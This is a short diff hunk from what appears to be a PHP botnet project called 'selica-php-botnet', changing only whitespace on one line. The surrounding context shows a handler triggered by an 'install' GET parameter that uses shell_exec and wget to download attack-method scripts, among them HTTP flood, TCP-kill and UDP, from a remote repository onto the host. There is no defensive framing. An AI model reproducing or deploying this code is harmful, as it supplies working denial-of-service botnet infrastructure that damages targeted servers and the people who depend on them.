@@ -10,7 +10,7 @@ if (!empty($_GET["install"])){
 	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/HTTP-RAW.js");
 	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/HTTP-RAND.js");
 	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/tcp_kill.js");
-	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/udp.py");
+	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/udp.py"); 
     echo("all methods has been downloaded");
 }
 
